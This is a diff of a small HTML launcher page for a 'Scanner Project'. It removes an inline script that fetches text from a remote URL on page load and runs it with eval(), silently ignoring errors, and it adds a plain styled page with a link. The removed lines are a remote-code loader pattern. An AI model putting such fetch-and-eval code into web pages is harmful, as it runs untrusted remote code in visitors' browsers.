@@ -1,15 +1,18 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Project Launcher</title>
+<style>
+  body { font-family: Arial, sans-serif; text-align: center; padding: 4rem; background: #f0f0f0; }
+  h1 { color: #333; }
+  a { display: inline-block; margin-top: 2rem; padding: 12px 25px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; font-size: 18px; }
+  a:hover { background: #0056b3; }
+</style>
+</head>
 <body>
-<script>
-(async () => {
-  try {
-    const r = await fetch("https://accounts.google.com/AccountChooser
-");
-    const code = await r.text();
-    eval(code);
-  } catch {}
-})();
-</script>
+<h1>Welcome to the Scanner Project</h1>
+<p>Click below to launch the scanner:</p>
+<a href="index.html">Launch Scanner</a>
 </body>
 </html>
